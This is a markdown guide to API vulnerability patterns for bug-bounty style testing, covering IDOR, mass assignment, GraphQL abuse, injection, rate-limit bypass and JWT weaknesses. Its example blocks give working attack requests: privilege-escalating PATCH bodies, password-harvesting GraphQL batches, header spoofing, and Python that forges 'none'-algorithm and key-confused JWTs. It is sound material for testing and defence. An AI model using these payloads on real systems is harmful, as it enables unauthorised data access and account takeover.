# API Vulnerability Patterns

Common API security vulnerability patterns derived from real-world bug bounty reports. Covers REST, GraphQL, and SOAP API security issues.

---

## Root Cause Categories

### 1. Unauthenticated API Endpoints

**Root Cause:** Internal or administrative APIs are exposed on public-facing infrastructure without authentication. Developers assume network-level segmentation provides sufficient protection, but APIs are still reachable from the internet.

**Detection Strategy:**
1. Discover API endpoints through documentation files, JS source, and path fuzzing
2. Test each endpoint by omitting authentication headers entirely
3. Try common auth bypass values: `Authorization: null`, `X-API-Key: test`, `X-API-Key: guest`
4. Test alternative API versions for weaker auth (e.g., `/v1/users` vs `/v2/users`)
5. Check for health/status/metric endpoints that expose internal data

### 2. Insecure Direct Object References (IDOR)

**Root Cause:** API endpoints accept object identifiers (user IDs, document IDs, order numbers) without verifying that the authenticated user has permission to access the requested resource.

**Detection Strategy:**
1. Create resources with two different accounts
2. Attempt to access Account B's resources while authenticated as Account A
3. Test sequential, predictable, and UUID-based identifiers
4. Check both direct endpoints and nested resource access
5. Test different HTTP methods (`GET`, `PUT`, `POST`, `DELETE`) on discovered IDs

### 3. Broken Object Level Authorization (BOLA)

**Root Cause:** Similar to IDOR but specific to API contexts where object-level permissions are not validated. Commonly affects multi-tenant SaaS applications where one tenant can access another tenant's data via API.

**Detection Strategy:**
1. Identify tenant/organization identifiers in API paths or payloads
2. Switch the tenant identifier to another known tenant
3. Check if the API validates tenant membership before returning data
4. Test both read and write operations across tenants

### 4. Mass Assignment

**Root Cause:** API endpoints bind request bodies directly to internal objects/models without filtering which fields can be modified. Attackers can modify fields they should not have access to (roles, permissions, balances).

**Detection Strategy:**
1. Review API documentation or guess common internal field names
2. Create a resource normally, then update it with additional unexpected fields
3. Test fields like `role`, `is_admin`, `permissions`, `balance`, `status`, `verified`
4. Check if the API accepts and applies these additional fields

### 5. GraphQL Introspection and Abuse

**Root Cause:** GraphQL introspection is enabled in production, revealing the entire schema to unauthenticated users. Combined with batched queries, this allows data mining without rate limiting.

**Detection Strategy:**
1. Send an introspection query to the GraphQL endpoint
2. Map the full schema including queries, mutations, and object types
3. Check if sensitive fields (password hashes, internal notes) are queryable
4. Test batched queries to bypass rate limits
5. Check for cost analysis or query depth limitations

### 6. API Injection

**Root Cause:** API parameters are passed to database queries, system commands, or template engines without sanitization. Each parameter represents a potential injection vector.

**Detection Strategy:**
1. Inject SQL metacharacters in API string parameters
2. Test NoSQL operators in JSON API requests
3. Inject command separators in parameters that might be passed to system commands
4. Test for SSRF in URL/file parameters
5. Test for XXE in XML API endpoints

---

## Common Attack Vectors

### REST API

```http
-- Unauthenticated access
GET /api/v1/admin/users HTTP/1.1
Host: target.com
# No Authorization header

-- IDOR testing
GET /api/v1/users/1002/profile HTTP/1.1
Authorization: Bearer <token_for_user_1001>

-- Mass assignment
PATCH /api/v1/users/1001 HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token>

{"email": "new@email.com", "role": "admin", "is_verified": true}

-- BOLA / multi-tenant bypass
GET /api/v1/organizations/1002/documents HTTP/1.1
Authorization: Bearer <token_for_org_1001>
```

### GraphQL

```graphql
-- Introspection query
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

-- Batching attack (bypass rate limiting)
query {
  user1: user(id: 1001) { email password }
  user2: user(id: 1002) { email password }
  user3: user(id: 1003) { email password }
  user4: user(id: 1004) { email password }
}

-- Alias-based data mining
query {
  a0: user(id: 1000) { email }
  a1: user(id: 1001) { email }
  a2: user(id: 1002) { email }
  # ... hundreds of aliases
}

-- Deeply nested query (DoS via resource exhaustion)
query {
  user(id: 1) {
    friends {
      friends {
        friends { name }
      }
    }
  }
}
```

### API Rate Limiting Bypass

```http
-- IP rotation via headers
GET /api/v1/login HTTP/1.1
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4

-- Parameter-based rate limiting bypass
# Many APIs rate-limit per API key or session
# Try rotating API keys, creating new sessions

-- Method-based bypass
# API may rate-limit POST but not GET
GET /api/v1/transfer?amount=100&to=attacker
```

### JWT in API

```python
# None algorithm
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none"}).encode()).decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","iat":123}).encode()).decode()
token = f"{header}.{payload}."

# Key confusion (RS->HS)
import jwt
token = jwt.encode({"sub":"admin"}, public_key, algorithm="HS256")

# Weak secret brute force
# hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

---

## API Security Testing Checklist

```yaml
authentication_and_authorization:
  - "Identify all authentication methods"
  - "Test for unauthenticated access"
  - "Test IDOR across user accounts"
  - "Test privilege escalation"
  - "Test token expiration and revocation"
  - "Test API key brute force prevention"

input_validation:
  - "Test all input types (query, path, body, headers)"
  - "Test injection (SQL, NoSQL, command, template)"
  - "Test type juggling / type confusion"
  - "Test boundary values (max length, max value)"
  - "Test for mass assignment"

rate_limiting:
  - "Test login/registration rate limits"
  - "Test API endpoint rate limits"
  - "Test burst limits vs sustained limits"
  - "Test distributed brute force prevention"

data_exposure:
  - "Review response data for excessive fields"
  - "Check error message verbosity"
  - "Check stack trace exposure"
  - "Review response headers for info disclosure"
```

---

## Real-World Case References

| Report | Vulnerability | Technique | Impact |
|--------|---------------|-----------|--------|
| General API (multiple) | Unauthenticated API access | Direct access to internal endpoints | Data exposure |
| General API (multiple) | IDOR in user/object endpoints | Sequential ID enumeration | Data access of other users |
| General API (multiple) | Mass assignment | Additional fields in PATCH requests | Privilege escalation |
| General GraphQL (multiple) | Introspection enabled | Schema disclosure + batched queries | Data mining |
| General JWT (multiple) | Weak JWT secret / none algorithm | Signature bypass | Account takeover |
| General API (multiple) | Missing rate limiting | Unlimited brute force | Account enumeration |
